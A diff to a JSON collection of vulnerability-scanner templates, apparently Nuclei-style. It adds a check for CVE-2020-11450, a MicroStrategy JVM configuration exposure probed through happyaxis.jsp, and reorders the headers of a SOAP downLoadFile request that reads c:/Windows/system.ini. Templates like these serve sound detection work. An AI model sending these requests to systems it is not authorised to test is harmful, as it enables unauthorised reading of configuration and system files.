@@ -10646,6 +10646,21 @@
       ]
     },
     {
+      "id": "CVE-2020-11450",
+      "info": {
+        "name": "Microstrategy Web 10.4 exposes the JVM configuration",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/MicroStrategyWS/happyaxis.jsp"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2020-11455",
       "info": {
         "name": "LimeSurvey 4.1.11 - Local File Inclusion",
@@ -12249,9 +12264,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
-            "content-type": "text/xml",
             "Cookie": "Login",
-            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile"
+            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
+            "content-type": "text/xml"
           },
           "method": "POST",
           "path": [
